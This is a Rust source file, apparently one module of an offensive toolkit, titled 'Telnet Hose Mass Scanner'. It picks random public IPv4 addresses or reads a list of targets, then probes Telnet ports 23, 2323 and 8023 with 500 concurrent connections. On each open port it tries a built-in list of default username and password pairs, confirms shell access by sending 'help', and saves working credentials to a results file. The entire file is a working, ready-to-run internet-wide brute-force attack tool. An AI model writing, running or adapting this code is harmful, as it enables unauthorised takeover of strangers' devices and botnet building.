use anyhow::Result;
use colored::*;
use rand::Rng;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::fs::OpenOptions;
use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::process::Command;
use tokio::sync::Semaphore;
use std::sync::atomic::{AtomicUsize, Ordering};
use tokio::time::timeout;

// Hardcoded exclusions (Private + Cloudflare + Google + Link Local etc)
const EXCLUDED_RANGES: &[&str] = &[
    "10.0.0.0/8", "127.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", // Private
    "224.0.0.0/4", "240.0.0.0/4", "0.0.0.0/8", // Multicast/Reserved
    "100.64.0.0/10", "169.254.0.0/16", "255.255.255.255/32", // Carrier/LinkLocal/Broadcast
    // Cloudflare
    "103.21.244.0/22", "103.22.200.0/22", "103.31.4.0/22", "104.16.0.0/13", 
    "104.24.0.0/14", "108.162.192.0/18", "131.0.72.0/22", "141.101.64.0/18", 
    "162.158.0.0/15", "172.64.0.0/13", "173.245.48.0/20", "188.114.96.0/20", 
    "190.93.240.0/20", "197.234.240.0/22", "198.41.128.0/17",
    "1.1.1.1/32", "1.0.0.1/32",
    // Google
    "8.8.8.8/32", "8.8.4.4/32"
];

// Top 3 Telnet Ports
const TELNET_PORTS: &[u16] = &[23, 2323, 8023];

// Default Credentials (Mixed Cartesian Product will be generated from these)
const TOP_USERS: &[&str] = &["root", "admin", "user", "support", "guest"];
const TOP_PASS: &[&str] = &["root", "admin", "user", "1234", "123456", "password", "password123", "default", "support", "guest", ""];

// Keywords to match in help output (must match at least 2)
const HELP_KEYWORDS: &[&str] = &[
    "show", "user", "system", "help", "exit", "quit", "logout", "enable", "config", "command", "menu", "admin"
];

// Internal Logic Constants
const CONCURRENCY: usize = 500;
const CONNECT_TIMEOUT_MS: u64 = 2000;
const LOGIN_TIMEOUT_MS: u64 = 6000; // Total time for a login attempt
const OUTPUT_FILE: &str = "telnet_hose_results.txt";
const STATE_FILE: &str = "telnet_hose_state.log"; // Stores "checked: <ip>"

#[derive(Debug, PartialEq, Clone, Copy)]
enum TelnetState {
    WaitingForBanner,
    SendingUsername,
    WaitingForPasswordPrompt,
    SendingPassword,
    WaitingForResult,
    SendingHelp,
    WaitingForHelpResponse,
}

pub async fn run(target: &str) -> Result<()> {
    println!("{}", "=== Telnet Hose Mass Scanner ===".bold().cyan());
    println!("Target Mode: {}", if target.is_empty() || target == "random" { "Internet Random" } else { target });
    println!("Concurrency: {}", CONCURRENCY);
    println!("Exclusions:  Enabled (Private + Cloudflare + Google)");
    println!("Output:      {}", OUTPUT_FILE);
    
    // Parse exclusions
    let mut exclusion_subnets = Vec::new();
    for cidr in EXCLUDED_RANGES {
        if let Ok(net) = cidr.parse::<ipnetwork::IpNetwork>() {
            exclusion_subnets.push(net);
        }
    }
    let exclusions = Arc::new(exclusion_subnets);

    // Prepare Credential Combos
    let mut creds = Vec::new();
    for u in TOP_USERS {
        for p in TOP_PASS {
            creds.push((u.to_string(), p.to_string()));
        }
    }
    // Also add reverse (pass as user) just in case for some
    creds.push(("1234".to_string(), "1234".to_string()));
    let creds = Arc::new(creds);

    let semaphore = Arc::new(Semaphore::new(CONCURRENCY));
    let stats_checked = Arc::new(AtomicUsize::new(0));
    let stats_found = Arc::new(AtomicUsize::new(0));

    // Spawn stats reporter
    let s_checked = stats_checked.clone();
    let s_found = stats_found.clone();
    tokio::spawn(async move {
        loop {
            tokio::time::sleep(Duration::from_secs(5)).await;
            println!(
                "[*] Status: {} IPs checked, {} Creds found",
                s_checked.load(Ordering::Relaxed),
                s_found.load(Ordering::Relaxed).to_string().green().bold()
            );
        }
    });

    if target.is_empty() || target == "random" || target == "0.0.0.0/0" {
        // Random Mode
        loop {
            let permit = semaphore.clone().acquire_owned().await.unwrap();
            let exc = exclusions.clone();
            let cr = creds.clone();
            let sc = stats_checked.clone();
            let sf = stats_found.clone();

            tokio::spawn(async move {
                let ip = generate_random_public_ip(&exc);
                
                // Check if already tested
                if !is_ip_checked(&ip).await {
                    mark_ip_checked(&ip).await;
                    scan_ip(Some(ip), cr, sf).await;
                }
                sc.fetch_add(1, Ordering::Relaxed);
                drop(permit);
            });
        }
    } else {
        // File/List Mode
        // We assume 'target' is a file path since it's a "hose" module
        let content = tokio::fs::read_to_string(target).await.unwrap_or_default();
        let lines: Vec<String> = content.lines().map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
        
        if lines.is_empty() {
            println!("No targets found in file or invalid target string.");
            return Ok(());
        }

        println!("Loaded {} IPs from list", lines.len());

        for ip_str in lines {
            let permit = semaphore.clone().acquire_owned().await.unwrap();
            let cr = creds.clone();
            let sc = stats_checked.clone();
            let sf = stats_found.clone();
            let ip = ip_str.clone();

            tokio::spawn(async move {
                 if !is_ip_checked(&ip).await {
                    mark_ip_checked(&ip).await;
                    scan_ip(ip.parse().ok(), cr, sf).await;
                }
                sc.fetch_add(1, Ordering::Relaxed);
                drop(permit);
            });
        }

        // Wait for all tasks to finish (simple hack: try to acquire all semaphores)
        // In a real hose, we just run until done.
        for _ in 0..CONCURRENCY {
            let _ = semaphore.acquire().await.unwrap();
        }
    }

    Ok(())
}

fn generate_random_public_ip(exclusions: &[ipnetwork::IpNetwork]) -> IpAddr {
    let mut rng = rand::rng();
    loop {
        let octets: [u8; 4] = rng.random();
        let ip = Ipv4Addr::from(octets);
        let ip_addr = IpAddr::V4(ip);
        
        let mut excluded = false;
        for net in exclusions {
            if net.contains(ip_addr) {
                excluded = true;
                break;
            }
        }
        
        if !excluded {
            return ip_addr;
        }
    }
}

async fn is_ip_checked(ip: &impl ToString) -> bool {
    // Grep for "checked: <ip>" in state file
    let ip_s = ip.to_string();
    let status = Command::new("grep")
        .arg("-F")
        .arg("-q")
        .arg(format!("checked: {}", ip_s))
        .arg(STATE_FILE)
        .status()
        .await;
    
    match status {
        Ok(s) => s.success(), // Grep returns 0 (true) if found
        Err(_) => false, // File might not exist yet
    }
}

async fn mark_ip_checked(ip: &impl ToString) {
    let data = format!("checked: {}\n", ip.to_string());
    if let Ok(mut file) = OpenOptions::new()
        .create(true)
        .append(true)
        .open(STATE_FILE)
        .await 
    {
        let _ = file.write_all(data.as_bytes()).await;
    }
}

async fn save_result(ip: &str, port: u16, user: &str, pass: &str) {
    let data = format!("{}:{} {}:{}\n", ip, port, user, pass);
    println!("{} {}", "[+] HOSE SUCCESS:".green().bold(), data.trim());
    if let Ok(mut file) = OpenOptions::new()
        .create(true)
        .append(true)
        .open(OUTPUT_FILE)
        .await 
    {
        let _ = file.write_all(data.as_bytes()).await;
    }
}

async fn scan_ip(
    ip_opt: Option<IpAddr>,
    creds: Arc<Vec<(String, String)>>,
    stats_found: Arc<AtomicUsize>
) {
    let Some(ip) = ip_opt else { return };
    let ip_str = ip.to_string();

    let mut handles = Vec::new();

    for &port in TELNET_PORTS {
        let socket_addr = SocketAddr::new(ip, port);
        let creds = creds.clone();
        let stats_found = stats_found.clone();
        let ip_str = ip_str.clone();

        handles.push(tokio::spawn(async move {
            // Quick Connect Check
            if timeout(Duration::from_millis(CONNECT_TIMEOUT_MS), TcpStream::connect(&socket_addr)).await.is_err() {
                return;
            }

            // Port is open, try credentials
            for (user, pass) in creds.iter() {
                match try_telnet_login_hose(&socket_addr, user, pass).await {
                    Ok(true) => {
                        save_result(&ip_str, port, user, pass).await;
                        stats_found.fetch_add(1, Ordering::Relaxed);
                        return; // Stop after first success on this port
                    }
                    _ => {}
                }
            }
        }));
    }

    // Wait for all ports to finish checking
    for h in handles {
        let _ = h.await;
    }
}

// Simplified & Optimized Telnet Login for Hose
// Wrapper for retry logic
async fn try_telnet_login_hose(
    socket: &SocketAddr,
    username: &str,
    password: &str,
) -> Result<bool> {
    // Attempt 1: Standard (try to detect, fallback to User+Pass)
    let (success, banner_seen) = do_telnet_session(socket, username, password, false).await?;
    if success {
        return Ok(true);
    }
    
    // If we failed AND never saw a proper banner (blind/silence), retry with Password Only
    if !banner_seen {
        // Attempt 2: Blind Password Only
        let (success_retry, _) = do_telnet_session(socket, username, password, true).await?;
        if success_retry {
            return Ok(true);
        }
    }
    
    Ok(false)
}

// Inner session logic
async fn do_telnet_session(
    socket: &SocketAddr,
    username: &str,
    password: &str,
    force_password_only: bool,
) -> Result<(bool, bool)> { // returns (success, banner_detected)
    
    let stream_res = timeout(
        Duration::from_millis(CONNECT_TIMEOUT_MS), 
        TcpStream::connect(socket)
    ).await;
    
    let stream = match stream_res {
        Ok(Ok(s)) => s,
        _ => return Ok((false, false)), // Connect fail
    };

    let (reader, mut writer) = tokio::io::split(stream);
    let mut reader = BufReader::new(reader);
    let mut buf = [0u8; 1024];

    // State Machine
    let mut state = TelnetState::WaitingForBanner;
    let start = Instant::now();
    let max_duration = Duration::from_millis(LOGIN_TIMEOUT_MS);
    let mut banner_detected = false;

    while start.elapsed() < max_duration {
        // Simple Read with Timeout
        let read_future = reader.read(&mut buf);
        let n = match timeout(Duration::from_millis(1500), read_future).await {
            Ok(Ok(0)) => return Ok((false, banner_detected)), // EOF
            Ok(Ok(n)) => n,
            Ok(Err(_)) => return Ok((false, banner_detected)), // Error
            Err(_) => {
                // Read Timeout logic
                
                // If waiting for banner and timed out -> No Banner Detected
                if state == TelnetState::WaitingForBanner {
                    // Decide action based on mode
                    if force_password_only {
                        state = TelnetState::SendingPassword;
                    } else {
                        state = TelnetState::SendingUsername;
                    }
                    continue;
                }
                
                if state == TelnetState::WaitingForResult || state == TelnetState::WaitingForHelpResponse {
                     // Timeout waiting for result/help usually means fail or stuck
                     return Ok((false, banner_detected));
                }
                
                continue; 
            }
        };

        // IAC Stripping (Minimal)
        let s = String::from_utf8_lossy(&buf[..n]);
        let lower = s.to_lowercase();
        
        // Handle current state
        match state {
            TelnetState::WaitingForBanner => {
                if lower.contains("pass") || lower.contains("word") {
                    banner_detected = true;
                    state = TelnetState::SendingPassword;
                } else if lower.contains("login") || lower.contains("user") || lower.contains("name") {
                    banner_detected = true;
                    state = TelnetState::SendingUsername;
                }
            }
            TelnetState::SendingUsername => {
                 // Should not happen here if we just transitioned, 
                 // but if we are reading response after sending user:
                 if lower.contains("pass") || lower.contains("word") {
                    state = TelnetState::SendingPassword;
                 }
            }
             TelnetState::WaitingForPasswordPrompt => {
                if lower.contains("pass") || lower.contains("word") {
                    state = TelnetState::SendingPassword;
                }
            }
            TelnetState::WaitingForResult => {
                if lower.contains("incorrect") || lower.contains("fail") || lower.contains("denied") || lower.contains("error") {
                    return Ok((false, banner_detected));
                }

                if lower.contains("#") || lower.contains("$") || (lower.contains(">") && !lower.contains(">>")) || lower.contains("welcome") {
                    state = TelnetState::SendingHelp;
                }
            }
            TelnetState::WaitingForHelpResponse => {
                 let mut match_count = 0;
                 for kw in HELP_KEYWORDS {
                     if lower.contains(kw) {
                         match_count += 1;
                     }
                 }
                 if match_count >= 2 {
                     return Ok((true, banner_detected));
                 }
            }
            _ => {}
        }

        // Perform Writes if needed
        match state {
            TelnetState::SendingUsername => {
                let _ = writer.write_all(format!("{}\r\n", username).as_bytes()).await;
                // Add requested 2s delay
                tokio::time::sleep(Duration::from_secs(2)).await;
                state = TelnetState::WaitingForPasswordPrompt;
            }
            TelnetState::SendingPassword => {
                let _ = writer.write_all(format!("{}\r\n", password).as_bytes()).await;
                state = TelnetState::WaitingForResult;
            }
            TelnetState::SendingHelp => {
                let _ = writer.write_all(b"help\r\n").await;
                state = TelnetState::WaitingForHelpResponse;
            }
            _ => {}
        }
    }

    Ok((false, banner_detected))
}
